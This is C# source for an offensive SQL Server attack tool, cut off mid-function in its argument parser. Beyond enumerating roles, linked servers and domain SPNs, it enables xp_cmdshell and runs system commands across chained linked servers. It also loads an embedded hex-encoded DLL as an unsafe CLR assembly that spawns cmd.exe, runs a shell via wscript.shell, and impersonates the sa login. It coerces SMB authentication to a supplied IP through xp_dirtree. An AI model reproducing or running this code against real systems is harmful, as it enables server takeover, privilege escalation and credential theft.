using System;
using System.Collections.Generic;
using System.Text;
using System.DirectoryServices;
using System.Data.SqlClient;
using System.IO;


namespace MSSQLEnum
{
    class Program
    {
        private string output_path = "c:\\windows\\tasks\\result.txt";
        private bool writeToFile = false;
        
        public dynamic getData(SqlConnection conn, string query, Boolean exec = false, Boolean raw = false)
        {
            // returns single result

            SqlCommand command = new SqlCommand(query, conn);
            SqlDataReader reader = command.ExecuteReader();
            if (!raw)
            {
                if (exec)
                {
                    // close reader as not bothered about the response
                    reader.Close();
                    
                }
                else
                {
                    reader.Read();
                }
            }
            
            return reader;
        }

        public void closeReader(SqlDataReader reader)
        {
            try
            {
                reader.Close();
            }
            catch 
            {

            }
           
        }

        private void writeOutput(string type, string message)
        {
            Dictionary<string, string> msgtype = new Dictionary<string, string>();
            msgtype.Add("warning","[-]");
            msgtype.Add("success", "[+]");
            msgtype.Add("info", "[*]");
            msgtype.Add("none", "");
            Console.WriteLine("{0} {1}", msgtype[type], message);
            if (writeToFile)
            {
                StreamWriter sw = File.AppendText(output_path);
                sw.WriteLine("{0} {1}", msgtype[type], message);
                sw.Close();
            }

        }

        public SqlConnection databaseConnect(string server, string db = "master", string pwd = "", string uid = "")
        {
            writeOutput("info", String.Format("Connecting to {0}",server));
            writeOutput("info", String.Format("Connecting to database: {0}", db));


            // create database connection string
            String conString;

            if (string.IsNullOrWhiteSpace(pwd))
            {
                conString = "Server = " + server + "; Database = " + db + ";Integrated Security = True;";

            }
            else
            {
                conString = "Server = " + server + "; Database = " + db + "; UID="+ uid+";PWD=" + pwd+  ";";
            }

            // connect to sql server
            SqlConnection conn = new SqlConnection(conString);
            if(writeToFile)
            {
                StreamWriter sw = File.CreateText(@"c:\windows\tasks\result.txt");
            }
           

            // catch errors
            try
            {
                // attempt to connect to server
                conn.Open();
                writeOutput("none","\tAuth success!\n");
                //sw.WriteLine("Auth Success!");
                
            }
            catch
            {
                // catch an error if we can't connect to DB
                writeOutput("none", "\tAuth failed\n");
                //sw.WriteLine("Auth Failed");
                conn.Close();
                // exit program with error code 1
                Environment.Exit(1);
            }

            //sw.Close();
            return conn;
        }

        public void closeDB(SqlConnection conn)
        {
            //close the connection
            conn.Close();
        }
       
        public bool getServerRole(SqlConnection conn)
        {
            bool priviledged_account = false;
            // get server role
            writeOutput("info","Getting Server roles");
            var result = getData(conn, "SELECT IS_SRVROLEMEMBER('public');");
            Int32 role = Int32.Parse(result[0].ToString());
           
            if (role == 1)
            {
                writeOutput("none","\tUser is a member of public role.");
            }
            else
            {
                writeOutput("none","\tUser is NOT a member of public role.");
            }
            
            closeReader(result);

           
            result = getData(conn, "SELECT IS_SRVROLEMEMBER('sysadmin');");
            role = Int32.Parse(result[0].ToString());
           
            if (role == 1)
            {
                priviledged_account = true;
                writeOutput("none", "\tUser is a member of sysadmin\n");
            }
            else
            {
                writeOutput("none", "\tUser is NOT a member of sysadmin \n");
            }

            closeReader(result);
            return priviledged_account;
        }

        public void getCurrentUser(SqlConnection conn)
        {
            writeOutput("info", "Getting Current user");
           
            // get current user
            var result = getData(conn, "SELECT SYSTEM_USER;");
            writeOutput("none", String.Format("\tLogged in as: {0}\n",result[0]));
            // close reader before using it again
            closeReader(result);

            result = getData(conn, "SELECT USER_NAME();");
           
            writeOutput("none", String.Format("\tMapped to user: {0}\n", result[0]));

            closeReader(result);
        }

        public void getUsers(SqlConnection conn)
        {
            writeOutput("info", "[*] Getting users on local server");
          
            var result = getData(conn, "select name as username,create_date,modify_date,type_desc as type,authentication_type_desc as authentication_type from sys.database_principals where type not in ('A', 'G', 'R', 'X') and sid is not null and name != 'guest' order by username;");
           
            writeOutput("none", String.Format("\tUsers: {0}\n", result[0]));
            closeReader(result);
            
        }

        public void getLinkedServers(SqlConnection conn, Boolean local = true, string server = null)
        {
            // get a list of linked servers
            writeOutput("info", "Getting linked servers");
            string cmd = null;
            if (local)
            {
                cmd = "EXEC sp_linkedservers;";
            }
            else
            {
                // need to check make sure server is not null otherwise it will fail
                cmd = "EXEC ('sp_linkedservers') AT " + server+ ";";
            }
            var result = getData(conn, cmd, false, true);
           
            while (result.Read())
            {
                writeOutput("none", String.Format("\tLinked Servers: {0}", result[0]));
            }
            closeReader(result);
        }

        public void linkedServerCmd(SqlConnection conn, string server, string cmd="SELECT @@version as version")
        {
           
            // run a command on a linked server
            string exec = "select * from openquery(\"" + server +"\", '"+ cmd +"');";
            SqlDataReader result = null;
            try
            {
                result = getData(conn, exec);
                writeOutput("success", string.Format("Linked Server command output: {0}", result[0]));
            }
            catch (SqlException)
            {
                writeOutput("error","SQL ERROR: Couldn't run command on " + server);
            }
            if(result != null)
            {
                closeReader(result);
            }

        }

        public void connectSMB(SqlConnection conn, string ip)
        {
            writeOutput("info", String.Format("Connecting to: {0}\n", ip));
            try
            {
               getData(conn, "EXEC master..xp_dirtree\"\\\\" + ip + "\\\\SecurityIsAGame\";", true);
            }
            catch (SqlException error)
            {
                writeOutput("error", String.Format("ERROR: {0}", error.Message));
            }

            writeOutput("success", "Done!\n");
        }

        public void execQuery(SqlConnection conn, string query = "SELECT @@version as version")
        {
            writeOutput("info", "Querying the database");
            writeOutput("info", String.Format("query: {0}",query));
            SqlDataReader result = null;
            try
            {
                result = getData(conn, query);
                writeOutput("none","\tRESULT:\n");
                writeOutput("none", String.Format("\t{0}\n",result[0]));
            }
            catch
            {

            }
            closeReader(result);
        }

        public void codeExec(SqlConnection conn, string command, string linkserver = null, string linklinkserver = null, bool rpc = false)
        {

            string enableadvoptions = "";
            string enablexpcmdshell = "";
            string rpccmd = "";
            string rpcout = "";
           
            string cmd = "";
            if (command == "True")
            {
                command = "whoami";
            }


            if (!rpc)
            {
                if (linkserver == null)
                {
                    // to be ran on local server
                    enableadvoptions = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;";
                    enablexpcmdshell = "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";

                    cmd = String.Format("EXEC xp_cmdshell '{0}'", command);
                  
                }
                else if (linklinkserver != null)
                {
                    //multi hop
                    enableadvoptions = String.Format("EXEC ('EXEC (''sp_configure ''''show advanced options'''',1; RECONFIGURE'') AT {2}') AT {1};", command, linkserver, linklinkserver);
                    enablexpcmdshell = String.Format("EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''',1; RECONFIGURE'') AT {2}') AT {1};", command, linkserver, linklinkserver);
                    cmd = String.Format("EXEC ('EXEC (''xp_cmdshell ''''{0}'''' '') AT {2}') AT {1};", command, linkserver, linklinkserver);
                }
                else
                {
                    // running command against a single linked server
                    enableadvoptions = String.Format("EXEC('sp_configure ''show advanced options'', 1; RECONFIGURE') AT {0};", linkserver);
                    enablexpcmdshell = String.Format("EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT {0};", linkserver);
                    cmd = String.Format("EXEC ('xp_cmdshell ''{0}'' ') AT {1};", command, linkserver);

                }
            }
            else
            {
                rpccmd = String.Format("exec sp_serveroption @server='{0}', @optname='rpc', @optvalue='true';", linkserver);
                rpcout = String.Format("exec sp_serveroption @server ='{0}', @optname ='rpc out', @optvalue ='true';", linkserver);


            }

            try
            {
               
                if (!rpc)
                {
                    writeOutput("info", "Enabling adv options");
                    getData(conn, enableadvoptions, true);
                    writeOutput("sucess", "Done!");

                    writeOutput("info", "Enabling xpcmdshell options");
                    getData(conn, enablexpcmdshell, true);
                    writeOutput("success", "Done!");

                    writeOutput("info", String.Format("Running command {0}", cmd));


                    var reader = getData(conn, cmd, false, true);
                    writeOutput("success", "Result of command is:\n");
                    int count = reader.FieldCount;
                    while (reader.Read())
                    {
                        for (int i = 0; i < count; i++)
                        {
                            Console.WriteLine(reader.GetValue(i));
                        }
                    }
                    reader.Close();
                }
                else
                {
                    writeOutput("info", "Enabling rpc options");
                    writeOutput("info", String.Format("RPC command: {0}", rpccmd));
                    getData(conn, rpccmd, true);
                    writeOutput("success", "Done!");

                    writeOutput("info", "Enabling rpcout options");
                    writeOutput("info", String.Format("RPC command: {0}", rpcout));
                    getData(conn, rpcout, true);
                    writeOutput("success", "Done!");
                }
               
               
            }
            catch (SqlException error)
            {
                Console.WriteLine("[-] SQLError: {0}", error.Message);
                writeOutput("error", String.Format("SQLError: {0}", error.Message));
            }
        }

        public void getImpersonation(SqlConnection conn)
        {
            writeOutput("info", "Get impersonation users allowed");
            var result = getData(conn, "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';");
           try
            { 
                writeOutput("none", String.Format("\tImpersonation allowed: {0}\n",result[0]));
            }
            catch
            {
                writeOutput("none","\tImpersonation allowed: NO RESULTS\n");
                
            }
           
            closeReader(result);
        }

        public void assemblyShellInMemory(SqlConnection conn, string execCmd="whoami")
        {
            /* this method runs the assembly in memory, the following code is generated from a c# dll file
               that invokes a new process and runs command shell.
                CODE:
                public static void cmdExec(SqlString execCommand)
                {
                    // create a new process for the shell
                    Process proc = new Process();
                    proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
                    proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand);
                    proc.StartInfo.UseShellExecute = false;
                    proc.StartInfo.RedirectStandardOutput = true;
                    proc.Start();

                    // capture the pipe data
                    SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
                    SqlContext.Pipe.SendResultsStart(record);
                    record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
                    SqlContext.Pipe.SendResultsRow(record);
                    SqlContext.Pipe.SendResultsEnd();

                    // wait for cmd to finish
                    proc.WaitForExit();
                    proc.Close();

                }
               you want to run another command instead of this one, then create a new dll in csharp and convert it to 
               hex using this:
             *
             * 
             * $assemblyFile = "./StoredProcedure.dll" 
                $stringBuilder = New-Object -Type System.Text.StringBuilder  
 
                $fileStream = [IO.File]::OpenRead($assemblyFile) 
                while (($byte = $fileStream.ReadByte()) -gt -1) 
                { 
                    $stringBuilder.Append($byte.ToString("X2")) | Out-Null 
                } 
                $stringBuilder.ToString() -join "" | Out-File cmdExec.txt
             * 
             */
            string hexExec = "4D5A90000300000004000000FFFF0000B80000000000000040000000000000000000000000000000000" +
                "0000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616" +
                "D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500006486020049F" +
                "2DECC0000000000000000F00022200B023000000C0000000400000000000000000000002000000000008001000000002" +
                "000000002000004000000000000000600000000000000006000000002000000000000030060850000400000000000004" +
                "000000000000000001000000000000020000000000000000000001000000000000000000000000000000000000000004" +
                "00000A8030000000000000000000000000000000000000000000000000000042A0000380000000000000000000000000" +
                "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002" +
                "000004800000000000000000000002E74657874000000AD0A000000200000000C0000000200000000000000000000000" +
                "00000200000602E72737263000000A80300000040000000040000000E000000000000000000000000000040000040000" +
                "000000000000000000000000000000000000000000000000000000000000000000000000000004800000002000500142" +
                "10000F008000001000000000000000000000000000000000000000000000000000000000000000000000000000000000" +
                "0000000000000000000000000000013300600B500000001000011731000000A0A066F1100000A72010000706F1200000" +
                "A066F1100000A7239000070028C12000001281300000A6F1400000A066F1100000A166F1500000A066F1100000A176F1" +
                "600000A066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000" +
                "A076F1B00000A0716066F1C00000A6F1D00000A6F1E00000A6F1F00000A281A00000A076F2000000A281A00000A6F210" +
                "0000A066F2200000A066F2300000A2A1E02282400000A2A00000042534A4201000100000000000C00000076342E302E3" +
                "3303331390000000005006C000000B8020000237E0000240300000C04000023537472696E67730000000030070000580" +
                "000002355530088070000100000002347554944000000980700005801000023426C6F620000000000000002000001471" +
                "502000900000000FA013300160000010000001C000000020000000200000001000000240000000F00000001000000010" +
                "00000030000000000740201000000000006009E012B0306000B022B030600BC00F9020F004B0300000600E4008F02060" +
                "081018F02060062018F020600F2018F020600BE018F020600D7018F02060011018F020600D0000C030600AE000C03060" +
                "045018F0206002C013D0206009D0388020A00FB00D8020A0057025A030E008003F9020A006200D8020E00AF02F902060" +
                "06D0288020A002000D8020A008E0014000A00EF03D8020A008600D8020600C0020A000600CD020A00000000000100000" +
                "0000001000100010010006F03000041000100010048200000000096003500620001000921000000008618F3020600020" +
                "00000010056000900F30201001100F30206001900F3020A002900F30210003100F30210003900F30210004100F302100" +
                "04900F30210005100F30210005900F30210006100F30215006900F30210007100F30210007900F30210008900F302060" +
                "09900F30206009900A1022100A90070001000B10096032600A90088031000A90029021500A900D40315009900BB032C0" +
                "0B900F3023000A100F3023800C9007D003F00D100B00344009900C1034A00E1003D004F00810061024F00A1006A02530" +
                "0D100FA034400D100470006009900A40306009900A80006008100F302060020007B0051012E000B0068002E001300710" +
                "02E001B0090002E00230099002E002B00AE002E003300AE002E003B00AE002E00430099002E004B00B4002E005300AE0" +
                "02E005B00AE002E006300CC002E006B00F6002E00730003011A000480000001000000000000000000000000009800000" +
                "004000000000000000000000059002C00000000000400000000000000000000005900140000000000040000000000000" +
                "00000000059008802000000000000003C4D6F64756C653E0053797374656D2E494F0053797374656D2E4461746100537" +
                "16C4D65746144617461006D73636F726C696200636D64457865630052656164546F456E640053656E64526573756C747" +
                "3456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F5" +
                "06970650053716C506970650053716C4462547970650053746F72656450726F63656475726500436C6F7365004775696" +
                "44174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C65417474726962757" +
                "46500417373656D626C795469746C654174747269627574650053716C50726F636564757265417474726962757465004" +
                "17373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B4174747269627" +
                "5746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E666967757" +
                "26174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D7" +
                "0696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F64756374417474726" +
                "96275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794" +
                "174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F557365536" +
                "8656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E67005" +
                "46F537472696E6700536574537472696E670053746F72656450726F6365647572652E646C6C0053797374656D0053797" +
                "374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F00537" +
                "47265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E53657276657" +
                "2002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7" +
                "053657276696365730053797374656D2E52756E74696D652E436F6D70696C65725365727669636573004465627567676" +
                "96E674D6F6465730053797374656D2E446174612E53716C54797065730053746F72656450726F6365647572657300507" +
                "26F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F724578697400536" +
                "56E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F5265646972656374537" +
                "4616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F7700000000003743003A0" +
                "05C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E006500780" +
                "06500000F20002F00430020007B0030007D00000D6F0075007400700075007400000013B3CB5EAC709F4C81D2AB8D7D6" +
                "3ED2100042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C032" +
                "00002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C5" +
                "61934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7" +
                "773010801000200000000001401000F53746F72656450726F636564757265000005010000000017010012436F7079726" +
                "967687420C2A920203230323100002901002430656236316230332D663935662D343763342D623733382D63376237663" +
                "263316138663600000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D7" +
                "6342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342" +
                "E372E3204010000000000000000002D92DBC40000000002000000710000003C2A00003C0C00000000000000000000000" +
                "0000010000000000000000000000000000000525344538A5483B2F13A6D4EBC57A02FDF05477601000000463A5C564D5" +
                "3686172655C4323536372697074735C53746F72656450726F6365647572655C53746F72656450726F6365647572655C6" +
                "F626A5C7836345C52656C656173655C53746F72656450726F6365647572652E706462000000000000000000000000000" +
                "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" +
                "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" +
                "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" +
                "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" +
                "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" +
                "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" +
                "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" +
                "000000000010010000000180000800000000000000000000000000000010001000000300000800000000000000000000" +
                "00000000001000000000048000000584000004C03000000000000000000004C0334000000560053005F0056004500520" +
                "0530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F0" +
                "00000000000000400000002000000000000000000000000000000440000000100560061007200460069006C006500490" +
                "06E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004AC0" +
                "20000010053007400720069006E006700460069006C00650049006E0066006F000000880200000100300030003000300" +
                "0300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F0" +
                "06D00700061006E0079004E0061006D0065000000000000000000480010000100460069006C006500440065007300630" +
                "0720069007000740069006F006E0000000000530074006F00720065006400500072006F0063006500640075007200650" +
                "00000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E00300" +
                "0000048001400010049006E007400650072006E0061006C004E0061006D0065000000530074006F00720065006400500" +
                "072006F006300650064007500720065002E0064006C006C0000004800120001004C006500670061006C0043006F00700" +
                "0790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200310" +
                "000002A00010001004C006500670061006C00540072006100640065006D00610072006B0073000000000000000000500" +
                "0140001004F0072006900670069006E0061006C00460069006C0065006E0061006D0065000000530074006F007200650" +
                "06400500072006F006300650064007500720065002E0064006C006C000000400010000100500072006F0064007500630" +
                "074004E0061006D00650000000000530074006F00720065006400500072006F006300650064007500720065000000340" +
                "008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E00300" +
                "0000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E00300" +
                "02E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000" +
                "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" +
                "0000000000000";
           
            StreamWriter sw = File.AppendText(@"c:\windows\tasks\result.txt");
            string enableOptions = "use msdb; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'clr enabled', 1;RECONFIGURE;EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";

            string createAssembly = String.Format("CREATE ASSEMBLY myshell FROM 0x{0} WITH PERMISSION_SET = UNSAFE", hexExec);
            string createProcedure = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR(4000) AS EXTERNAL NAME [myshell].[StoredProcedures].[cmdExec]";

            string cmd = String.Format("EXEC cmdExec '{0}';", execCmd);

            getData(conn, enableOptions, true);
            getData(conn, createAssembly, true);
            getData(conn, createProcedure, true);
            var result = getData(conn, cmd);

            Console.WriteLine(string.Format("OUTPUT: {0}", result[0]));
            sw.WriteLine(string.Format("OUTPUT: {0}", result[0]));
            sw.Close();
            closeReader(result);
            // clear assembly
            clearAssembly(conn);

        }

        public void assemblyShell(SqlConnection conn, string path = "C:\\windows\\tasks\\StoredProcedure.dll")
        {
           
            string enableOptions = "use msdb; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'clr enabled', 1;RECONFIGURE;EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";

            string createAssembly = "CREATE ASSEMBLY myshell FROM '"+ path +"' WITH PERMISSION_SET = UNSAFE";
            string createProcedure = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR(4000) AS EXTERNAL NAME [myshell].[StoredProcedures].[cmdExec]";

            string cmd = "EXEC cmdExec 'whoami';";

            getData(conn, enableOptions, true);
            getData(conn, createAssembly, true);
            getData(conn, createProcedure, true);
            var result = getData(conn, cmd);

            writeOutput("none",string.Format("OUTPUT: {0}", result[0]));
            closeReader(result);
            // clear assembly
            clearAssembly(conn);
        }

        public void clearAssembly(SqlConnection conn)
        {
           
            writeOutput("none","Removing assembly");
           
            string switchDB = "use msdb;";
            string dropPro = "DROP PROCEDURE cmdExec;";
            string dropAssembly = "DROP ASSEMBLY myshell;";
   
            getData(conn, switchDB, true);
            try
            {
                getData(conn, dropPro, true);
            }
            catch(SqlException error)
            {
                writeOutput("error","Some issue with clearing procedure");
                writeOutput("error",String.Format("ERROR: {0}", error));
                
            }
          
            try
            {
                getData(conn, dropAssembly, true);
            }
            catch(SqlException error)
            {
                writeOutput("error","Some issue with clearing assembly");
                writeOutput("error",String.Format("ERROR: {0}", error));
            }
          
        }

        public void storedProcedureShell(SqlConnection conn, string command = "whoami")
        {
            
            // this method expects the dll to be on disk
            string enableOle = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
            string execCmd = String.Format("DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{0}';",command);
            writeOutput("info","Trying to reconfigure Ole Automation.");
            try
            {
                getData(conn, enableOle, true);
                writeOutput("none","\tDone!");
            }
            catch (SqlException error)
            {
                writeOutput("error",String.Format("ERROR: {0}\n", error.Message));
            }

            writeOutput("info","Trying to run command");
            try
            {
                getData(conn, execCmd, true);
                writeOutput("success","Ran successfully");
            }
            catch (SqlException error)
            {
                writeOutput("error",String.Format("ERROR: {0}\n", error.Message));
            }
            

        }

        public void impersonateMe(SqlConnection conn, string user="sa")
        {
            // get current user
            SqlDataReader result = null;
            string query = "";
            //Console.WriteLine(user);
            if (user == "dbo")
            {
                query = "use msdb; EXECUTE AS USER ='dbo';";
            }
            else
            {
                query = String.Format("EXECUTE AS LOGIN='{0}';",user);
            }
            try
            {
                result = getData(conn,query);
                writeOutput("none",String.Format("Executed as {0} successfully", user));
               
            }
            catch
            {
                writeOutput("none", String.Format("Executing as {0} failed!", user));
            }

            closeReader(result);

        }

        public void getSPN(string name = "*", string domain = null)
        {
            printBanner();
            DirectoryEntry root;
            if (domain != null)
            {
                
                string[] tmpd = domain.Split('.');
                StringBuilder sb = new StringBuilder();
                sb.Insert(0,"LDAP://");
                foreach (var item in tmpd)
                {
                    sb.Append("DC=" + item.ToString() + ",");
                }
                //remove the last ,
                sb.Remove(sb.Length -1, 1);
                writeOutput("none", String.Format("domain:{0}", sb.ToString()));
                root = new DirectoryEntry(sb.ToString());
            }
            else
            {
                root = new DirectoryEntry();
            }
            // or pass in something like "LDAP://dc=example,dc=com" to query a different domain
            using (var searcher = new DirectorySearcher(root))
            {
                if(name != "*")
                {
                    writeOutput("success", String.Format("Getting SPN details for: ",name));
                    searcher.Filter = "(servicePrincipalName=" + name + "/*)";
                }
                else
                {

                    writeOutput("none","\tGetting all SPN details for domain");
                    searcher.Filter = "(servicePrincipalName=*)";
                }
                try
                {
                    using (var results = searcher.FindAll())
                    {

                        foreach (SearchResult result in results)
                        {

                            for (int x = 0; x < result.Properties["serviceprincipalname"].Count; x++)
                            {
                                writeOutput("none", String.Format("\t" + result.Properties["serviceprincipalname"][x].ToString()));
                            }

                        }
                    }
                }
                catch (System.DirectoryServices.DirectoryServicesCOMException)
                {
                    writeOutput("error", String.Format("TIMED OUT: Not able to query {0}", domain));
                } 
            }
            Console.WriteLine();

        }

        private void printBanner()
        {
            string banner = @"                                                         
             _____ _____ _____ _____ __    _____               
            |     |   __|   __|     |  |  |   __|___ _ _ _____ 
            | | | |__   |__   |  |  |  |__|   __|   | | |     |
            |_|_|_|_____|_____|__  _|_____|_____|_|_|___|_|_|_|
                                 |__|                          ";         
            Console.WriteLine(banner);
            Console.WriteLine("@SecurityIsAGame\n\n");
        }

        public void printhelp()
        {
            printBanner();
            Console.WriteLine("\n***********************************************************************************************\n");
            Console.WriteLine("-getspn \nArgument does not require the server parameter and can be ran on its own,\nSPNs are always ran first and will output first.");
            Console.WriteLine("Added the ability to search for MSSQLSvc accounts so that you can quickly find potential targets\n");
            Console.WriteLine("***********************************************************************************************");

            Console.WriteLine("\n-getspn [spn]            : Enumerate SPN accounts of the domain, if spn is included then only search for that spn\nOtherwise collect all SPN's");
            Console.WriteLine("                           Example:  .\\MSSqlEnum.exe -getspn MSSQLSvc\n\n");
            Console.WriteLine("\n\nREQUIRED ARGUMENTS\n");
            Console.WriteLine("-server                  : Enter the server name or IP of the MSSQL server that you want to connect to.");
            Console.WriteLine("                           Example: .\\MSSqlEnum.exe -server sql1.example.com");
            Console.WriteLine("\n\nOPTIONAL ARGUMENTS\n");
            Console.WriteLine("-db                      : The database name, if none is provided then 'master' will be used");
            Console.WriteLine("-username [username]     : The username to use to authenticate to the server");
            Console.WriteLine("-password [password]     : The password to use to authenticate to the server");
            Console.WriteLine("-domain                  : If the domain is set then it will query in the specified domain\n");
            Console.WriteLine("-getlinked [server]      : This gets linked servers to the specified server that you request.");
            Console.WriteLine("                           If you leave it blank then local server is used.");
            Console.WriteLine("-roles                   : Get the server role of the current user");
            Console.WriteLine("-impersonation           : Get the allowed to impersonate user accounts for the current user on the local server");
            Console.WriteLine("-output [filename]       : Write output to file, if no filename is specified then c:\\windows\\Temp\\result.txt is used");
            Console.WriteLine("-getusers                : Get the users on the local server");
            Console.WriteLine("-impersonate [user]      : Try to impersonate as a different account on the local server,");
            Console.WriteLine("                           if a user is not specified then 'sa' user is tried by default");
            Console.WriteLine("-command [command]       : This will run a command using xp_cmdshell, must have execute privileges or be in sysadmin group");
            Console.WriteLine("                           then it will attempt to run as the impersonated user.");
            Console.WriteLine("                           You can run multi argument commands but has to be double quoted\n");
            Console.WriteLine("                           Example: .\\MSSqlEnum.exe -server dc01 -impersonate sa -command \"ping 192.168.0.1\"\n");
            Console.WriteLine("                           Also possible to run powershell commands by encoding the powershell command as base64.");
            Console.WriteLine("                           The base64 below has been reduced to fit on the screen.\n");
            Console.WriteLine("                           Example: .\\MSSqlEnum.exe -server dc01 -impersonate sa -command \"powershell -enc IABJAEUAB4AHQAJwApACkA\"\n");
            Console.WriteLine("-sp [command]            : Create a stored procedure and use wscript to run shell commands.  Must have sa privileges for this to work.");
            Console.WriteLine("                           Command must be in double quotes and escaped if required\n");
            Console.WriteLine("                           Example: MSSqlEnum.exe -server dc01 -sp \"ping 192.168.0.1\"");
            Console.WriteLine("                           Example: MSSqlEnum.exe -server dc01 -sp \"cmd /c echo \\\"P@Wn3d!\\\" > c:\\windows\\temp\\h4x3d.txt\"\n");
            Console.WriteLine("-asm [command]           : Create a custom assembly and run a basic shell to execute commands, if command is not provided then 'whoami' will be ran");
            Console.WriteLine("-clearasm                : Clear assembly, useful if the asm command fails but still creates the assembly");
            Console.WriteLine("-query [query]           : Execute a sql query on the database, if no query is added then @@version is ran");
            Console.WriteLine("-smb [IP]                : Get the local server to connect to and SMB share, IP must be provided");
            Console.WriteLine("-linkserver [a,b,c]      : Try and run a query/command on a linked server, if the -query parameter is not included then it will run 'SELECT @@version' by default.");
            Console.WriteLine("                           If the -query parameter is included with -linkserver parameter then it will run the query value on the specified linkserver.");
            Console.WriteLine("                         : if you want to run a system command using xp cmdshell through a linked server(s) then include the -command parameter");
            Console.WriteLine("                         : instead of the -query parameter");
            Console.WriteLine("                           in the -linkserver parameter include the links you want to run commands on in the correct order");
            Console.WriteLine("                           this can be used for privilege escalation via linked server authentication misconfigurations.\n");
            Console.WriteLine("                           Example: .\\MSSqlEnum.exe -server appsrv01 -linkserver dc01,appsrv01 -command \"whoami\"\n");
            Console.WriteLine("-rpc                     : The argument will try to enable rpc out functionality on a linked server, requires sysadmin role");
            
           
        }
        

        private Dictionary<string, bool> requiredParams()
        {
            var reqparam = new Dictionary<string, bool>();
            reqparam.Add("server", true);
            return reqparam;
        }
        public Dictionary<string, object> ArgumentParse(string[] args)
        {
            Dictionary<string, object> arguments = new Dictionary<string, object>();

            Dictionary<string, bool> req = requiredParams();


            for (int x = 0; x < args.Length; x++)
            {
                if (args[x].StartsWith("-"))
                {
                    //found an argument
                    try
                    {
                        if(args.Length == x -1)
                        {
                            // last argument
                            if (args[x].StartsWith("-"))
                            {
                                arguments.Add(args[x].Replace("-", ""), true);

                            }

                        }
                        else
                        {
                            try
                            {
                                if (args[x + 1].StartsWith("-"))
                                {
                                    arguments.Add(args[x].Replace("-", ""), true);

                                }
                                else
                                {
                                   
                                    arguments.Add(args[x].Replace("-", ""), args[x + 1]);
                                    x += 1;
                                }

                            }
                            catch (IndexOutOfRangeException)
                            {
                                // dealing with last param and it doesn't have a value
                                //need to check if it is supposed to have a value
                                arguments.Add(args[x].Replace("-", ""), true);
                                x += 1;
                            }
                           
                        }
                       
                    }
                    catch
                    {
                        Console.WriteLine("[-] Error with args...");
                    }
                   
                    
                }
                else
                {
                    // an issue may be missing the key
                    writeOutput("none", String.Format("Do not understand '{0}' as a valid argument", args[x]));
                    // print help
                    printhelp();
                    break;
                }
            }

            if (arguments.ContainsKey("getspn"))
            {
                if (arguments["getspn"].GetType() == typeof(bool))
                {
                    if (arguments.ContainsKey("domain"))
                    {
                        getSPN("*", arguments["domain"].ToString());
                    }
                    else
                    {
                        getSPN();
                    }
                }
                else
                {
                    if (arguments.ContainsKey("domain"))
                    {
                        getSPN(arguments["getspn"].ToString(), arguments["domain"].ToString());
                    }
                    else
                    {
